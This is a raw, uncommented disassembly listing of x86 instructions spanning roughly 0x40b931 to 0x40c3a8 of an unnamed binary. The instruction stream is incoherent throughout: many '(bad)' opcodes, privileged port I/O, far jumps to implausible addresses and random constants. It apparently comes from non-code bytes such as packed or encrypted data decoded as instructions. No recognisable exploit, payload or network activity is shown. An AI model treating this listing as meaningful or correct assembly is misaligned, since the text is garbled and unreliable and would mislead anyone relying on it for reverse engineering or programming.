  40b931:	out    dx,al
  40b932:	(bad)  
  40b933:	es and eax,0xfc1eacb9
  40b939:	in     eax,0xb4
  40b93b:	sbb    DWORD PTR [esi+eiz*8],eax
  40b93e:	inc    BYTE PTR [ecx]
  40b940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b941:	mov    eax,0xa07c06fe
  40b946:	clc    
  40b947:	adc    bh,ch
  40b949:	out    0xfe,eax
  40b94b:	idiv   BYTE PTR [edi+0x70]
  40b94e:	cld    
  40b94f:	add    DWORD PTR [eax],eax
	...
  40b979:	add    BYTE PTR [eax-0x7b17003c],ch
  40b97f:	sbb    DWORD PTR [eax],ecx
  40b981:	jmp    0x6b2c8a6e
  40b986:	jbe    0x40b96f
  40b988:	imul   ebp,ecx,0x3cff48d3
  40b98e:	dec    edx
  40b98f:	repz test al,0x93
  40b992:	jg     0x40b97a
  40b994:	mov    BYTE PTR [esi+edi*2],ch
  40b997:	jae    0x40b921
  40b999:	adc    ch,bh
  40b99b:	in     eax,0xfd
  40b99d:	sbb    al,0x4a
  40b99f:	repz adc eax,0xfee67f9f
  40b9a5:	sbb    al,0x7e
  40b9a7:	out    0x74,al
  40b9a9:	loope  0x40b9c0
  40b9ab:	rsm    
  40b9ad:	add    al,al
  40b9af:	fwait
  40b9b0:	leave  
  40b9b1:	ret    0x599b
  40b9b4:	push   ebp
  40b9b5:	mov    eax,ebx
  40b9b7:	ffreep st(3)
  40b9b9:	cld    
  40b9ba:	cmp    eax,0x20146a5f
  40b9bf:	scas   al,BYTE PTR es:[edi]
  40b9c0:	push   es
  40b9c1:	call   0x403165
  40b9c6:	push   ds
  40b9c7:	push   ds
  40b9c8:	sti    
  40b9c9:	push   0xbeef5997
  40b9ce:	(bad)  
  40b9cf:	outs   dx,DWORD PTR ds:[esi]
  40b9d0:	pop    ecx
  40b9d1:	inc    ecx
  40b9d2:	addr16 mov cl,0xa6
  40b9d5:	pop    ecx
  40b9d6:	xchg   esi,eax
  40b9d7:	pop    ecx
  40b9d8:	push   DWORD PTR [ebp+0x5f]
  40b9db:	xor    DWORD PTR [ebx-0x2a],esp
	...
  40ba06:	add    BYTE PTR [eax],al
  40ba08:	and    BYTE PTR [edi+edi*8+0x759c3375],bl
  40ba0f:	or     BYTE PTR [edi],bh
  40ba11:	ret    0xffa9
  40ba14:	xor    BYTE PTR [edx+0xe2704c2],dl
  40ba1a:	mov    ch,ah
  40ba1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1d:	xchg   ebx,eax
  40ba1e:	fdiv   st,st(7)
  40ba20:	xor    BYTE PTR [ebp+ecx*4-0x1f6ecbb],bl
  40ba27:	jne    0x40ba3c
  40ba29:	pushf  
  40ba2a:	xor    eax,0xff184fae
  40ba2f:	out    0x41,eax
  40ba31:	sar    bh,0xff
  40ba34:	sbb    al,0x99
  40ba36:	jne    0x4113ee
  40ba3c:	cwde   
  40ba3d:	sbb    eax,0x58d700f7
  40ba42:	add    bh,al
  40ba44:	sbb    ah,BYTE PTR [ebx]
  40ba46:	inc    DWORD PTR [edi]
  40ba48:	out    0x58,eax
  40ba4a:	push   0x0
  40ba4c:	sub    eax,0x3e006a5f
  40ba51:	pop    eax
  40ba52:	add    al,0x8d
  40ba54:	jnp    0x40ba24
  40ba56:	ror    BYTE PTR [ebx+eax*8-0x4e00c79a],cl
  40ba5d:	inc    edx
  40ba5e:	inc    ecx
  40ba5f:	jne    0x40ba07
  40ba61:	ins    DWORD PTR es:[edi],dx
  40ba62:	mov    dh,0xfb
  40ba64:	xchg   esi,eax
  40ba65:	repnz cdq 
  40ba67:	add    BYTE PTR [esi],bh
  40ba69:	jmp    0x412eb0
	...
  40ba96:	cmp    ecx,DWORD PTR [ebx-0xdc1fe6d]
  40ba9c:	stos   BYTE PTR es:[edi],al
  40ba9d:	mov    esi,esi
  40ba9f:	mov    dl,0x2
  40baa1:	push   ebx
  40baa3:	in     eax,dx
  40baa4:	sub    dl,BYTE PTR [ecx-0x52]
  40baa7:	and    eax,0x42b55040
  40baac:	mov    es,WORD PTR [ebp-0xbfd296]
  40bab2:	out    dx,al
  40bab3:	lahf   
  40bab4:	sub    al,BYTE PTR [ecx-0x72]
  40bab7:	inc    ebp
  40bab8:	inc    eax
  40bab9:	mov    ebx,eax
  40babb:	inc    edx
  40babc:	cmp    bh,bh
  40babe:	inc    ecx
  40babf:	pop    edx
  40bac0:	cwde   
  40bac1:	lods   al,BYTE PTR ds:[esi]
  40bac2:	cmp    DWORD PTR [ebp-0x72],ebx
  40bac5:	test   DWORD PTR [esi],edx
  40bac7:	in     eax,dx
  40bac8:	dec    DWORD PTR ds:[esi+0x7f5952da]
  40bacf:	repnz aas 
  40bad1:	mov    ch,0xe
  40bad3:	add    eax,0x4f11ff3f
  40bad8:	outs   dx,BYTE PTR ds:[esi]
  40bad9:	dec    eax
  40bada:	jg     0x40bace
  40badc:	sub    dl,BYTE PTR [edx-0x76c0eb2f]
  40bae2:	ret    
  40bae3:	adc    eax,0x87f1ff37
  40bae8:	add    al,0x68
  40baea:	test   al,0x4a
  40baec:	(bad)  
  40baef:	outs   dx,BYTE PTR ds:[esi]
  40baf0:	xor    al,0xf7
  40baf2:	fstp   DWORD PTR [edx-0x5a]
  40baf5:	aas    
  40baf6:	or     esi,DWORD PTR [ebp+0xc530]
	...
  40bb24:	leave  
  40bb25:	sti    
  40bb26:	sbb    al,0x6f
  40bb28:	shl    ebx,0x5f
  40bb2b:	mov    DWORD PTR [edx+0x243f85eb],ebp
  40bb31:	pop    ebx
  40bb32:	adc    DWORD PTR [edi+0x7],eax
  40bb35:	call   0x3f75:0xeaeb3ee9
  40bb3c:	cdq    
  40bb3d:	jecxz  0x40bb5a
  40bb3f:	outs   dx,BYTE PTR ds:[esi]
  40bb40:	push   es
  40bb41:	call   0x3f55:0xb3f02be9
  40bb48:	mov    bh,0xdd
  40bb4a:	inc    eax
  40bb4b:	aaa    
  40bb4c:	jns    0x40bb31
  40bb4e:	jae    0x40bad9
  40bb50:	xchg   edx,eax
  40bb51:	jmp    0x40bb90
  40bb53:	aas    
  40bb54:	push   cs
  40bb55:	jae    0x40bb67
  40bb57:	(bad)  
  40bb59:	pop    edx
  40bb5a:	cs jns 0x40bbab
  40bb5d:	jmp    0x40bb84
  40bb5f:	aas    
  40bb60:	push   ecx
  40bb61:	sub    eax,0x5afecc4f
  40bb66:	add    ebx,esi
  40bb68:	nop
  40bb69:	jecxz  0x40bb78
  40bb6b:	or     edi,esi
  40bb6d:	addr16 loopne 0x40baf2
  40bb70:	repz push ebp
  40bb73:	sub    DWORD PTR ds:[eax+0x7c],ebx
  40bb77:	adc    esp,DWORD PTR [ecx]
  40bb79:	sub    al,0x5e
  40bb7b:	mov    DWORD PTR [esi],ebx
  40bb7d:	jmp    0x40bb64
  40bb7f:	outs   dx,BYTE PTR ds:[esi]
  40bb81:	repz call 0xc223c4f6
  40bb87:	pop    ss
	...
  40bbb0:	add    BYTE PTR [eax],al
  40bbb2:	xor    eax,0x8e06551b
  40bbb7:	repz mov esp,0xa5e2f16a
  40bbbd:	mov    dh,bl
  40bbbf:	jmp    0xe900:0x4820b5ff
  40bbc6:	cmp    eax,0x88dbcde
  40bbcb:	loop   0x40bbcb
  40bbcd:	jmp    0x54c41c63
  40bbd2:	adc    edx,ebp
  40bbd4:	dec    BYTE PTR [esi+0x6a75673d]
  40bbda:	mov    esi,0x687ef6f3
  40bbdf:	pop    ebx
  40bbe0:	je     0x40bbe7
  40bbe2:	aam    0xe2
  40bbe4:	mov    esp,DWORD PTR [ebp+esi*8-0x17]
  40bbe8:	(bad)  
  40bbe9:	ins    WORD PTR es:[edi],dx
  40bbeb:	loope  0x40bba1
  40bbed:	inc    ebp
  40bbee:	push   eax
  40bbef:	loop   0x40bbef
  40bbf1:	inc    ecx
  40bbf2:	test   DWORD PTR [edi],eax
  40bbf4:	dec    DWORD PTR [esi+0x44]
  40bbf7:	sbb    esi,DWORD PTR [ebp+ebx*4-0x44]
  40bbfb:	mov    al,ds:0xe22836d7
  40bc00:	(bad)  
  40bc01:	mov    esp,0xe9007a74
  40bc06:	sub    BYTE PTR [ecx-0xcba6302],ah
  40bc0c:	push   ecx
  40bc0d:	push   ecx
  40bc0e:	or     dl,ah
  40bc10:	(bad)  
  40bc11:	pop    esp
  40bc12:	adc    edx,ebp
  40bc14:	dec    BYTE PTR [esi]
	...
  40bc3e:	add    BYTE PTR [eax],al
  40bc40:	js     0x40bcaa
  40bc42:	or     BYTE PTR [ecx],dl
  40bc44:	fwait
  40bc45:	mov    bl,0xfe
  40bc47:	(bad)  
  40bc48:	imul   ebp,DWORD PTR [eax-0x1d9c0119],0xfffffffe
  40bc4f:	je     0x40bc96
  40bc51:	repz xchg edi,eax
  40bc53:	xchg   ecx,eax
  40bc54:	push   ebx
  40bc55:	loop   0x40bc55
  40bc57:	xchg   esp,eax
  40bc58:	push   0xffffffea
  40bc5a:	(bad)  
  40bc5b:	(bad)  
  40bc5c:	inc    ebx
  40bc5d:	test   al,0xe3
  40bc5f:	(bad)  
  40bc60:	cmp    esp,edx
  40bc62:	inc    BYTE PTR [eax]
  40bc64:	xor    cl,BYTE PTR [edi-0x18]
  40bc67:	pop    eax
  40bc68:	iret   
  40bc69:	pop    ds
  40bc6a:	(bad)  
  40bc6b:	jmp    DWORD PTR [edx+0x37]
  40bc6e:	idiv   edi
  40bc70:	test   al,0x1f
  40bc72:	jne    0x40bc7c
  40bc74:	scas   eax,DWORD PTR es:[edi]
  40bc75:	inc    edx
  40bc76:	test   al,0xff
  40bc78:	test   al,0x1f
  40bc7a:	mov    ch,0xe4
  40bc7c:	mov    al,ds:0x6fe8ff1f
  40bc81:	je     0x40bc82
  40bc83:	(bad)  
  40bc84:	mov    eax,0x28f7ec69
  40bc89:	and    al,ch
  40bc8b:	dec    ebp
  40bc8c:	cld    
  40bc8d:	pop    ds
  40bc8e:	(bad)  
  40bc8f:	call   DWORD PTR [edx+0x2f]
  40bc92:	idiv   edi
  40bc94:	sbb    BYTE PTR [edi],ch
  40bc96:	inc    edx
  40bc97:	stos   DWORD PTR es:[edi],eax
  40bc98:	call   0xe7f6bbbc
  40bc9d:	daa    
  40bc9e:	(bad)  
  40bc9f:	(bad)  
  40bca0:	jmp    edi
  40bca2:	test   eax,0xff
	...
  40bccb:	add    BYTE PTR [eax],al
  40bccd:	add    al,bh
  40bccf:	pop    ds
  40bcd0:	inc    ebp
  40bcd1:	clc    
  40bcd2:	push   cs
  40bcd3:	sbb    eax,0x2028fffd
  40bcd8:	jne    0x40bcd6
  40bcda:	dec    DWORD PTR [ebx]
  40bcdc:	xchg   esi,eax
  40bcdd:	add    BYTE PTR [edi-0x6c],ah
  40bce0:	ret    0x5708
  40bce3:	or     BYTE PTR [edx-0xb6d2b14],cl
  40bce9:	call   edx
  40bceb:	push   eax
  40bcec:	call   0x984fdc
  40bcf1:	mov    edx,esp
  40bcf3:	and    al,0xff
  40bcf5:	jne    0x40bd26
  40bcf7:	xor    eax,0x2028ab21
  40bcfc:	mov    DWORD PTR [ebp+0x1b],eax
  40bcff:	and    BYTE PTR [ebp-0x4],dh
  40bd02:	call   0x3f40b3b0
  40bd07:	jg     0x40bd19
  40bd09:	call   0xff7c8645
  40bd0e:	inc    ebp
  40bd0f:	mov    dl,0xb6
  40bd11:	cmp    eax,0x6a3837b7
  40bd16:	ds ja  0x40bcdf
  40bd19:	rep outs dx,BYTE PTR ds:[esi]
  40bd1b:	mov    cl,0xb5
  40bd1d:	sti    
  40bd1e:	out    0x53,al
  40bd20:	pop    eax
  40bd21:	dec    ecx
  40bd23:	in     eax,dx
  40bd24:	inc    edx
  40bd25:	je     0x40bd3e
  40bd27:	pop    edx
  40bd28:	add    al,0x10
  40bd2a:	test   eax,0x46753c90
  40bd2f:	retf   0xa786
	...
  40bd5a:	add    BYTE PTR [eax],al
  40bd5c:	test   eax,0xa6753c61
  40bd61:	imul   esi,DWORD PTR [esi+0xae7990b],0x3bd1e2e8
  40bd6b:	dec    DWORD PTR [ecx+0xbff3707]
  40bd71:	xchg   BYTE PTR [esi*2-0x586265ba],bh
  40bd78:	jno    0x40bd13
  40bd7a:	cmp    al,0x75
  40bd7c:	push   0xffffff8a
  40bd7e:	ins    BYTE PTR es:[edi],dx
  40bd7f:	stos   BYTE PTR es:[edi],al
  40bd80:	popa   
  40bd81:	sub    DWORD PTR [edx-0x3e],ecx
  40bd84:	inc    esi
  40bd85:	repnz aad 0x8a
  40bd88:	bound  esi,QWORD PTR [ebp+0x47]
  40bd8b:	call   0xbf6fe80
  40bd90:	push   esi
  40bd91:	retf   
  40bd92:	imul   edi,edi,0x39
  40bd95:	std    
  40bd96:	inc    edx
  40bd97:	jne    0x40bdd4
  40bd99:	mov    eax,0xf236c249
  40bd9e:	lea    eax,[ebp+0x2e]
  40bda1:	ret    0x753b
  40bda4:	dec    edx
  40bda5:	pop    edx
  40bda6:	call   0xe69bcf5a
  40bdab:	paddd  mm1,QWORD PTR [edi+0x65]
  40bdaf:	sahf   
  40bdb0:	ds pop ebx
  40bdb2:	jmp    0xc12030f1
  40bdb7:	mov    ah,BYTE PTR [edi+ebx*8-0x107c723b]
  40bdbe:	mov    ebp,0xb1
	...
  40bde7:	add    BYTE PTR [eax],al
  40bde9:	add    ch,ah
  40bdeb:	fistp  QWORD PTR [ebx]
  40bded:	sub    cl,bl
  40bdef:	gs mov cl,0x2c
  40bdf2:	mov    dh,BYTE PTR [ebp+eiz*4-0x729a4ac5]
  40bdf9:	das    
  40bdfa:	ja     0x40be6f
  40bdfc:	sti    
  40bdfd:	(bad)  
  40bdff:	pop    edx
  40be00:	aaa    
  40be01:	sub    al,0x92
  40be03:	enter  0x3e8,0x35
  40be07:	sbb    esi,esp
  40be09:	add    eax,0x34621d95
  40be0e:	es dec ebp
  40be10:	adc    eax,ebp
  40be12:	xchg   ecx,eax
  40be13:	test   DWORD PTR [edx],0xea5b3e91
  40be19:	xor    esi,DWORD PTR [edi+0x1eac4165]
  40be1f:	test   DWORD PTR [eax-0x7d0cf7fd],ebp
  40be25:	xchg   edx,eax
  40be26:	ds pop ebx
  40be28:	repnz inc ebx
  40be2a:	jmp    0x40be88
  40be2c:	inc    edx
  40be2d:	pop    ds
  40be2e:	les    ecx,FWORD PTR [edx+0x27]
  40be31:	add    al,0x3e
  40be33:	mov    edi,DWORD PTR [ebx+0x1df2d33a]
  40be39:	mov    cl,0x39
  40be3b:	repz (bad) 
  40be3f:	fbstp  TBYTE PTR [edx+0x694bb9db]
  40be45:	cli    
  40be46:	sub    DWORD PTR [eax+0x3b],ebp
  40be49:	lods   al,BYTE PTR ds:[esi]
  40be4a:	ds dec ebx
  40be4c:	add    BYTE PTR [esi],al
	...
  40be76:	add    BYTE PTR [eax],al
  40be78:	xchg   esp,eax
  40be79:	fidiv  WORD PTR [ecx+eiz*8+0x65]
  40be7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7f:	out    0x44,al
  40be81:	fidiv  WORD PTR [ebp+ebx*8+0x44]
  40be85:	push   0x56aed6ec
  40be8a:	call   0xff1f1e3d
  40be8f:	(bad)  
  40be90:	scas   al,BYTE PTR es:[edi]
  40be91:	repnz out 0xb9,eax
  40be94:	push   edx
  40be95:	fdivp  st(6),st
  40be97:	fs (bad) 
  40be99:	out    dx,al
  40be9a:	dec    edi
  40be9b:	shl    DWORD PTR [ebx+ebp*4],0xfe
  40be9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bea0:	sbb    BYTE PTR [ebx+0x5e],bl
  40bea3:	mov    al,0x7b
  40bea5:	push   ebx
  40bea6:	add    BYTE PTR [ecx+ecx*8],bh
  40bea9:	out    dx,eax
  40beaa:	and    BYTE PTR [ebp+0x13007169],0x4f
  40beb1:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40beb5:	push   ebp
  40beb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb7:	jbe    0x40bf0d
  40beb9:	aam    0x44
  40bebb:	ins    DWORD PTR es:[edi],dx
  40bebc:	in     eax,0x0
  40bebe:	pop    ecx
  40bebf:	test   al,0x3d
  40bec1:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40bec5:	mov    dh,0xfb
  40bec7:	push   esi
  40bec8:	xor    al,0x71
  40beca:	add    cl,al
  40becc:	jne    0x40be52
  40bece:	inc    ecx
  40becf:	jmp    0xa89af969
  40bed4:	cmp    eax,0x858734de
  40bed9:	fwait
  40beda:	add    BYTE PTR [ecx+0x0],al
	...
  40bf05:	add    ah,dl
  40bf07:	scas   al,BYTE PTR es:[edi]
  40bf08:	(bad)  
  40bf09:	cmp    BYTE PTR es:[ebx],bl
  40bf0c:	je     0x40bf11
  40bf0e:	xchg   edx,eax
  40bf0f:	push   ebp
  40bf10:	pop    edx
  40bf11:	test   al,0x3d
  40bf13:	mov    ebp,eax
  40bf15:	bound  esp,QWORD PTR [esi-0x38ff0122]
  40bf1b:	or     esi,edi
  40bf1d:	jne    0x40bf4e
  40bf1f:	xor    ah,bl
  40bf21:	(bad)  
  40bf22:	adc    BYTE PTR [eax+ebp*8],ah
  40bf25:	mov    DWORD PTR [esi+0x21],edi
  40bf28:	jmp    FWORD PTR [edx+0x3d]
  40bf2b:	das    
  40bf2c:	fisubr DWORD PTR [ebp-0x3ff4dc20]
  40bf32:	fwait
  40bf33:	(bad)  
  40bf34:	data16 sti 
  40bf36:	cs sbb bh,bh
  40bf39:	dec    edi
  40bf3a:	ud1    ebp,DWORD PTR [ebx+0x5aea0ff]
  40bf41:	pop    edx
  40bf42:	es push edi
  40bf44:	push   eax
  40bf45:	call   0x403576
  40bf4a:	pop    es
  40bf4b:	pop    es
  40bf4c:	(bad)  
  40bf4d:	jne    0x40bf1e
  40bf4f:	xor    DWORD PTR [ebx-0x17dc2f02],esi
  40bf55:	pop    ecx
  40bf56:	(bad)  
  40bf57:	and    edi,edi
  40bf59:	push   0xffffffa3
  40bf5b:	xor    DWORD PTR [edx+0xb2420ad],ebp
  40bf61:	rcr    BYTE PTR [ebx+0x2efb66fc],0x1a
  40bf68:	dec    DWORD PTR [edi+0x0]
	...
  40bf93:	add    bh,ch
  40bf95:	call   0xaf21bf45
  40bf9a:	add    eax,0x5059a65a
  40bf9f:	call   0x4035e0
  40bfa4:	(bad)  
  40bfa5:	or     esi,edi
  40bfa7:	jne    0x40c018
  40bfa9:	xor    DWORD PTR [ebx-0x17dbef02],eax
  40bfaf:	sub    DWORD PTR [esi+0x746aff23],edi
  40bfb5:	xor    DWORD PTR [edx-0x53],edi
  40bfb8:	and    BYTE PTR [ebx+ecx*1],ah
  40bfbb:	sar    BYTE PTR [esi],0xbe
  40bfbe:	frstor [edi+0x35]
  40bfc1:	lods   al,BYTE PTR ds:[esi]
  40bfc2:	sar    edi,0x79
  40bfc5:	dec    edx
  40bfc6:	add    ch,BYTE PTR [ebp+0x6aade21]
  40bfcc:	je     0x40bf81
  40bfce:	add    dl,BYTE PTR [eax+0x26]
  40bfd1:	jmp    0xfed4:0x2309ff66
  40bfd8:	mov    ebp,edx
  40bfda:	sub    dl,BYTE PTR [ebx-0x8]
  40bfdd:	add    eax,0xdaf7e838
  40bfe2:	aaa    
  40bfe3:	(bad)  
  40bfe4:	jmp    0x6c3ff808
  40bfe9:	jmp    0xc937:0xa5a06c2a
  40bff0:	cld    
  40bff1:	test   BYTE PTR [edx],0x55
  40bff4:	mov    ch,0xc6
  40bff6:	add    esp,0x0
	...
  40c020:	add    BYTE PTR [eax],al
  40c022:	loop   0x40bfe9
  40c024:	aaa    
  40c025:	dec    ebx
  40c027:	das    
  40c028:	cmp    BYTE PTR [eax-0x4f],dl
  40c02b:	inc    edi
  40c02c:	adc    al,0xff
  40c02e:	xor    esp,esi
  40c030:	sub    al,BYTE PTR [ebx+ecx*8]
  40c033:	repnz add cl,BYTE PTR [ebx]
  40c036:	jle    0x40c02d
  40c038:	jge    0x40bff8
  40c03a:	aas    
  40c03b:	repnz add al,bh
  40c03e:	add    edi,DWORD PTR [edx+0x3]
  40c041:	add    BYTE PTR [esi],bh
  40c043:	repnz aas 
  40c045:	inc    ebp
  40c046:	jb     0x40bfcd
  40c048:	add    BYTE PTR [eax],al
  40c04a:	sbb    BYTE PTR ds:[ebx],al
  40c04d:	push   0x3e
  40c04f:	or     BYTE PTR [ebx],al
  40c051:	push   0x3e
  40c053:	outs   dx,DWORD PTR ds:[esi]
  40c054:	mov    esi,0x7e76eef3
  40c059:	hlt    
  40c05a:	dec    ecx
  40c05b:	sub    eax,0x5b495038
  40c060:	pushf  
  40c061:	cmp    eax,DWORD PTR [ecx+0x66]
  40c064:	sbb    eax,0xe8c7102b
  40c069:	add    eax,DWORD PTR [ebp+0x1b]
  40c06c:	xchg   ebp,eax
  40c06d:	(bad)  
  40c06e:	push   ss
  40c06f:	(bad)  
  40c071:	add    edi,DWORD PTR [esi]
  40c073:	jae    0x40c0e8
  40c075:	retf   
  40c076:	jle    0x40c0d3
  40c078:	imul   BYTE PTR [ebp+0x67c5f341]
  40c07e:	or     esp,ebx
  40c080:	cmp    BYTE PTR [ebx+0x3063cdee],cl
	...
  40c0ae:	add    BYTE PTR [eax],al
  40c0b0:	icebp  
  40c0b1:	fcmovnbe st,st(5)
  40c0b3:	aam    0x8f
  40c0b5:	repz cmc 
  40c0b7:	addr16 jmp 0xeec23098
  40c0bd:	jecxz  0x40c07c
  40c0bf:	aaa    
  40c0c0:	out    0x6d,al
  40c0c2:	xor    DWORD PTR [edi],0xabe970d1
  40c0c8:	jno    0x40c04b
  40c0ca:	sub    BYTE PTR [ecx+eax*8],al
  40c0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0ce:	cwde   
  40c0cf:	das    
  40c0d0:	mov    ecx,0x45b195db
  40c0d5:	repz sbb BYTE PTR [ebx-0x57],ch
  40c0d9:	fld    TBYTE PTR [edi-0x7f]
  40c0dc:	call   0x15b:0x24377de3
  40c0e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e4:	neg    DWORD PTR [ecx-0x152cc917]
  40c0ea:	pop    ebp
  40c0eb:	aaa    
  40c0ec:	sbb    ebx,0x856607d3
  40c0f2:	xor    BYTE PTR [edi],0x71
  40c0f5:	shl    DWORD PTR [ebx+0x24],1
  40c0f8:	jno    0x40c0d5
  40c0fa:	inc    ebp
  40c0fb:	stos   BYTE PTR es:[edi],al
  40c0fc:	popa   
  40c0fd:	jae    0x40c0b0
  40c0ff:	fsin   
  40c101:	pop    edx
  40c102:	add    BYTE PTR [esi],dh
  40c104:	iret   
  40c105:	jmp    0xf574:0xdc112ef6
  40c10c:	adc    eax,0x711eab21
  40c111:	in     al,0x84
  40c113:	add    eax,0x0
	...
  40c13c:	add    BYTE PTR [eax],al
  40c13e:	popa   
  40c13f:	(bad)  
  40c141:	cmp    DWORD PTR ds:0xfaa34f43,0xffffffda
  40c148:	std    
  40c149:	xor    al,0x52
  40c14b:	sar    dh,cl
  40c14d:	test   BYTE PTR [eax+0x50],0xc
  40c151:	add    DWORD PTR [ecx],esi
  40c153:	push   es
  40c154:	jmp    esi
  40c156:	mov    dl,0xe0
  40c158:	out    0xd6,eax
  40c15a:	xor    dl,bl
  40c15c:	imul   ebp,ecx,0x285a45a5
  40c162:	inc    edx
  40c163:	fidiv  DWORD PTR [ecx+edi*4-0x410125f0]
  40c16a:	mov    fs,WORD PTR [esi-0x18]
  40c16d:	in     eax,dx
  40c16e:	fs (bad) 
  40c171:	pusha  
  40c172:	mov    esi,0x8a6f6b7
  40c177:	fidivr WORD PTR [ebp+eax*4-0x16012598]
  40c17e:	out    dx,al
  40c17f:	arpl   WORD PTR [ebx-0x12da2b4],ax
  40c185:	xchg   BYTE PTR ds:0x166a654f,bh
  40c18b:	(bad)  
  40c18c:	div    BYTE PTR [esi+0x48]
  40c18f:	pop    ebx
  40c190:	je     0x40c19f
  40c192:	mov    ebp,0x485ee818
  40c197:	(bad)  
  40c199:	aam    0x8c
  40c19b:	inc    edx
  40c19c:	add    cl,ch
  40c19e:	sbb    BYTE PTR [ecx],bl
  40c1a0:	call   esp
	...
  40c1ca:	add    BYTE PTR [eax],al
  40c1cc:	xor    eax,0xb30065c3
  40c1d1:	xchg   ecx,eax
  40c1d2:	(bad)  
  40c1d3:	call   edx
  40c1d5:	xor    edi,0x759108ff
  40c1db:	or     bh,bh
  40c1dd:	push   ebx
  40c1de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1df:	call   FWORD PTR [eax]
  40c1e1:	xchg   ecx,eax
  40c1e2:	mov    ch,0xe8
  40c1e4:	push   eax
  40c1e5:	xchg   ecx,eax
  40c1e6:	(bad)  
  40c1e7:	call   edx
  40c1e9:	gs call 0xffd2459b
  40c1ef:	jmp    DWORD PTR [edx+0x7a]
  40c1f2:	idiv   edi
  40c1f4:	sbb    BYTE PTR [eax-0xfc0f78b],dl
  40c1fa:	mov    ds:0xb59018ff,eax
  40c1ff:	loopne 0x40c1e1
  40c201:	(bad)  
  40c202:	(bad)  
  40c203:	call   DWORD PTR [edx-0x3c6f1799]
  40c209:	(bad)  
  40c20a:	(bad)  
  40c20b:	call   edx
  40c20d:	xor    dh,bh
  40c20f:	(bad)  
  40c210:	clc    
  40c211:	(bad)  
  40c212:	jne    0x40c21c
  40c214:	out    dx,eax
  40c215:	fsub   QWORD PTR [ebx-0x4a707701]
  40c21b:	in     al,0x90
  40c21d:	(bad)  
  40c21e:	(bad)  
  40c21f:	call   0x3ffa57
  40c224:	fmul   DWORD PTR [ecx-0x20]
  40c227:	test   eax,0x59e88f
  40c22d:	nop
  40c22e:	(bad)  
  40c22f:	inc    DWORD PTR [eax]
	...
  40c259:	add    BYTE PTR [edx-0x7d],ah
  40c25c:	idiv   edi
  40c25e:	sbb    BYTE PTR [edi-0x6ff758b2],al
  40c264:	push   DWORD PTR [ebp-0x7841]
  40c26a:	out    dx,eax
  40c26b:	fwait
  40c26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26d:	call   FWORD PTR [eax]
  40c26f:	nop
  40c270:	mov    ch,0xdc
  40c272:	cmp    DWORD PTR ds:0x5d6b56ff,esi
  40c279:	jmp    DWORD PTR [ecx+0x20]
  40c27c:	outs   dx,DWORD PTR ds:[esi]
  40c27d:	lock push ecx
  40c27f:	cwde   
  40c280:	xor    eax,0x33bfcbff
  40c285:	jne    0x40c2bd
  40c287:	sbb    al,0xf7
  40c289:	std    
  40c28a:	inc    ecx
  40c28b:	xor    BYTE PTR ds:0x35722eb5,0xff
  40c292:	es iret 
  40c294:	pop    ebx
  40c295:	jmp    FWORD PTR [ecx]
  40c297:	push   0xffffffbf
  40c299:	not    DWORD PTR [edi]
  40c29b:	hlt    
  40c29c:	xor    al,0xff
  40c29e:	sbb    edx,ebx
  40c2a0:	lods   eax,DWORD PTR ds:[esi]
  40c2a1:	sti    
  40c2a2:	or     edx,DWORD PTR es:[eax+0x427b3e00]
  40c2a9:	or     al,0x3e
  40c2ab:	xchg   edi,eax
  40c2ac:	mov    esp,ebp
  40c2ae:	mov    ebp,0x3e6a36fe
  40c2b3:	sbb    al,0xe
  40c2b5:	push   DWORD PTR [ebx-0x46]
  40c2b8:	sub    ch,BYTE PTR [esi]
  40c2ba:	call   0x0:0x8933a1
	...
  40c2e5:	add    BYTE PTR [eax],al
  40c2e7:	add    BYTE PTR [ebx+0x7474ab16],al
  40c2ed:	add    DWORD PTR [eax+ebp*2],0x3c
  40c2f1:	ret    0x8002
  40c2f4:	shl    DWORD PTR [edi+0xc],0xe8
  40c2f8:	mov    cl,0xf7
  40c2fa:	xor    edi,edi
  40c2fc:	es ja  0x40c2d9
  40c2ff:	inc    eax
  40c300:	ds jmp 0x833770f3
  40c306:	add    al,0xff
  40c308:	adc    ecx,edx
  40c30a:	sub    ah,ah
  40c30c:	xchg   ebx,eax
  40c30d:	push   ecx
  40c30e:	xor    al,0xff
  40c310:	adc    eax,DWORD PTR [esi+0x34]
  40c313:	jne    0x40c34b
  40c315:	pop    ebx
  40c316:	push   ecx
  40c317:	ret    0xd89d
  40c31a:	pop    ebp
  40c31b:	dec    edx
  40c31c:	jl     0x40c37d
  40c31e:	jmp    0x680877f1
  40c323:	aas    
  40c324:	adc    al,0x45
  40c327:	xor    al,0xcb
  40c329:	push   ds
  40c32a:	cmp    eax,0xd94e50d3
  40c32f:	xor    al,0xd3
  40c331:	inc    cx
  40c333:	pop    edx
  40c334:	lods   al,BYTE PTR ds:[esi]
  40c335:	pop    ebx
  40c336:	jmp    0x64a8c143
  40c33b:	jne    0x40c37c
  40c33d:	pop    ebx
  40c33e:	jmp    0xe914467f
  40c343:	add    edi,DWORD PTR [esi]
  40c345:	pop    ebx
  40c346:	cs mov esi,0x3e5d80d
	...
  40c374:	add    BYTE PTR [eax],al
  40c376:	ds inc ebp
  40c378:	jmp    0xe982cd26
  40c37d:	test   eax,0x382be701
  40c382:	mov    fs,esi
  40c384:	arpl   WORD PTR [eax],di
  40c386:	jmp    0xe9159962
  40c38b:	dec    ebp
  40c38c:	shl    DWORD PTR [ebx],1
  40c38e:	imul   edx,edi,0xffffffd0
  40c391:	pop    edi
  40c392:	lods   al,BYTE PTR ds:[esi]
  40c393:	pop    edx
  40c394:	jmp    0xec8f5597
  40c399:	sbb    al,0xbf
  40c39b:	pop    ecx
  40c39c:	jmp    0x312619a4
  40c3a1:	lds    edi,FWORD PTR [ecx-0x59ebec28]
  40c3a7:	(bad)  
  40c3a8:	aas    
